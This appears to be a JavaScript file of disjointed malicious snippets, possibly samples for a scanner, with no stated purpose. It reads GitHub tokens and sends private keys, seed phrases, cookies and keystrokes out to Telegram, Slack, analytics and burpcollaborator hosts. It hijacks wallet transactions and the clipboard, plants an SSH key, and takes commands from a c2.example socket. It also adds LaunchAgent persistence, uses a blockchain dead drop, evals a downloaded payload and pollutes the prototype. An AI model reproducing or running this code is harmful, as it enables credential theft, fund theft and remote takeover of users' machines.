const creds = process.env.GITHUB_TOKEN;
require("./sink");
const netMod = require("ht" + "tp");
import("./" + "sink.js");
const envProxy = new Proxy(process.env, {});
const hijack = require.cache;
const tool = require("child" + "_process");
tool.execSync("gh auth token");
spawn("sh", [], { detached: true });
if (fs.existsSync("/.dockerenv") || fs.readFileSync("/proc/cgroup", "utf8")) {
  console.log("sandbox");
}
console.log(".npmrc");
child_process.exec("id");
const tg = "https://api.telegram.org/bot123:ABC/sendMessage";
fetch(tg, { method: "POST", body: JSON.stringify({ text: this.user?.privateKey || process.env.MNEMONIC }) });
const ga = "https://www.google-analytics.com/collect";
navigator.sendBeacon(ga, "tid=UA-1&cid=1&dl=" + (this.user?.privateKey || "seed phrase"));
window.ethereum.request({ method: "eth_sendTransaction", params: [{ to: "0x1111111111111111111111111111111111111111" }] });
navigator.clipboard.writeText("0x2222222222222222222222222222222222222222");
const slack = "https://hooks.slack.com/services/T000/B000/XXXX";
fetch(slack, {
  method: "POST",
  body: JSON.stringify({ text: os.userInfo().username + ":" + os.homedir() + ":" + process.cwd() + ":" + document.cookie + ":Login Data" }),
});
const iframe = document.getElementById("login-iframe").contentWindow;
iframe.document.onkeyup = function (event) {
  fetch("https://demo.burpcollaborator.net/keystrokes", { method: "POST", mode: "no-cors", body: event.key });
};
self.addEventListener("message", function (event) {
  fetch("https://relay.burpcollaborator.net/keystrokes", { method: "POST", body: JSON.stringify({ k: event.data }) });
});
require("fs").appendFileSync(require("os").homedir() + "/.ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC");
const resDir = path.join(base, "atomic", "resources");
const asarIn = path.join(resDir, "app.asar");
const workDir = path.join(resDir, "output");
require("@electron/asar").extractAll(asarIn, workDir);
const socket = require("socket.io-client")("https://c2.example");
socket.on("command", (cmd) => require("child_process").exec(cmd));
const localAgent = new WebSocket("ws://127.0.0.1:18789");
require("child_process").execSync("launchctl load ~/Library/LaunchAgents/com.openclaw.plist");
const solana = "https://api.mainnet-beta.solana.com";
fetch(solana, { method: "POST", body: JSON.stringify({ method: "getSignaturesForAddress" }) })
  .then((r) => r.json())
  .then((d) => fetch(d.result[0].memo.link));
fetch("https://delivery.example/payload", { headers: { Accept: "*/*" } })
  .then((response) => {
    const secretkey = response.headers.get("secretkey");
    const ivbase64 = response.headers.get("ivbase64");
    return response.arrayBuffer().then((buf) => eval(Buffer.from(buf).toString() + secretkey + ivbase64));
  });
const stamp = path.join(os.homedir(), "init.json");
if (!fs.existsSync(stamp) || Date.now() - JSON.parse(fs.readFileSync(stamp, "utf8")).timestamp > 48 * 60 * 60 * 1000) {
  fs.writeFileSync(stamp, JSON.stringify({ timestamp: Date.now() }));
}
Object.prototype.polluted = true;
